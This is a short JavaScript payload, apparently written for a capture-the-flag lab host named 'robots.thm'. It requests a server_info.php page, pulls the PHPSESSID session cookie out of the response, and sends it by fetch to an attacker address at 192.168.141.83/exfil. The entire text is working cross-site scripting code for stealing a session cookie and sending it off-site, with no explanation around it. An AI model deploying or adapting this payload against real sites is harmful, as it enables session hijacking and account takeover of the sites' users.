var url = "http://robots.thm/harm/to/self/server_info.php";
var attacker = "http://192.168.141.83/exfil";
var xhr = new XMLHttpRequest();

xhr.onreadystatechange = function() {
    if (xhr.readyState == XMLHttpRequest.DONE) {
        var match = xhr.responseText.match(/PHPSESSID=([a-zA-Z0-9]+)/);
        if (match) {
            fetch(attacker + "?cookie=" + match[1]);
        }
    }
}

xhr.open('GET', url, true);
xhr.send(null);
